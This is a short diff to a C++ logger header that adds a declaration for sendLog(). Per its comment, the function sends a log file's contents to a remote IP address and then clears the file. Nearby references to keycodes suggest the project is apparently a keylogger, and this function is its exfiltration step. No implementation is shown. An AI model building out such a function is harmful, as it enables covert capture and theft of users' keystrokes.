@@ -64,6 +64,17 @@ namespace logger {
 	void connectHandler (std::string handler, bool verbose=false);
 
 	/**
+	 *  Checks the size of the log file. If it big enough sends file content to the 'server' and clears the file.
+	 * 
+	 * @param logName Path to the log file.
+	 * @param ipAddress The address where the log file content's will be sent to.
+	 * @param verbose mode of the program. When true the function produces more details. Default to false.
+	 * 
+	 * Note: If size of file is not big enough, will not send file.
+	 */
+	void sendLog (std::string logName, std::string ipAddress, bool verbose=false);
+
+	/**
 	 * For Debug mode. List keycode in the array.
 	 * 
 	 * @param debug Mode of program. When true list contents of internal variables. Defaults to false
